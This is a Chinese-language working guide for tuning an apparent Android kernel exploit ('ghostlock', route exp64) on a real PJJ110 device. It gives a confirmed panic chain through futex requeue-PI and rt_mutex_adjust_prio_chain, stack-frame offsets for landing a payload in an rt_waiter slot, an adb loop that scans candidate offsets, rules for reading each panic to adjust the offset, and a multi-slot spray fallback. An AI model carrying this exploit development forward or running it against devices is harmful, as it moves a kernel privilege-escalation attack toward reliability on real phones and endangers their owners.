# EXP64_STAMP_OFF 真机扫描指南（2026-08-22）

## 背景
PJJ110 真机 panic 已确认触发链通（sched_setattr consumer → rt_mutex_adjust_prio_chain+0x188 NULL deref），
唯一卡点 = payload 没落在 rt_waiter 槽（STAMP_OFF 用 S22U 占位 0x60）。
2026-08-22 静态推导确认：PJJ110 真 futex_wait_requeue_pi (0x295870) 帧 = 0x1a0、waiter=sp+0x90，
与 S22U 完全一致 → 真实 STAMP_OFF 大概率在 0x60..0x98 区间（不确定处来自 do_futex 帧 0x130 vs S22U 0x70 和 sock 链帧差）。

## 已改代码（stack.c）
- EXP64_STAMP_OFF 默认 0x60，可用环境变量覆盖：`EXP64_STAMP_OFF=<hex>`
- 每轮 stamp 前读 env（`getenv` + `strtoul(…,16)`），无需重编译
- 主进程 env 会经 execl 继承给子进程（launcher 不清理 env）

## 真机一轮扫描（设备重连后）
```bash
adb push ghostlock /data/local/tmp/ && adb push offsets_5.10_pjj110.json /data/local/tmp/offsets.json
for off in 60 68 70 78 80 88 90 98; do
  echo "=== EXP64_STAMP_OFF=0x$off ==="
  adb shell "EXP64_STAMP_OFF=0x$off GHOSTLOCK_ROUTE=exp64 /data/local/tmp/ghostlock"
  # 崩溃 = 该偏移把 payload 写进了 rt_waiter 但字段还差（记录 Comm + panic pc）
  # 无崩溃/exit 0 = 该偏移没命中
  adb wait-for-device  # 崩溃后 adb 消失，等重枚举
done
```

## 判定
- panic 在 rt_mutex_adjust_prio_chain+0x188（ldar w8,[x27],x27=waiter->lock）且 Comm=cve-exp64：
  STAMP_OFF 已把 payload 写进 rt_waiter 但 lock 字段指向 NULL → 接近了，调 ±0x10
- panic 在别的 rtmutex 偏移或别的栈帧：payload 落错槽，调 ±0x20
- 完全不 panic（exit 0）：payload 没进内核拷贝路径（EACCES 预检失败）或彻底错过

## 备选：更稳的多槽写法
如果单槽扫描不稳，可以一次把 payload 喷到 2~3 个相邻槽（0x60/0x70/0x80），
牺牲确定性换覆盖。stamp rounds 64 次够用。改 stack.c 的 memcpy 为循环即可。

## 真机重连速查
qdl reset 后:lsusb 找 18d1:4ee9 → adb 需 chmod + 手机授权；或无线重 pair。
qdl 在 /tmp/qdl/build/qdl（若 /tmp 被清见 HANDOFF v7 §4 重建）。
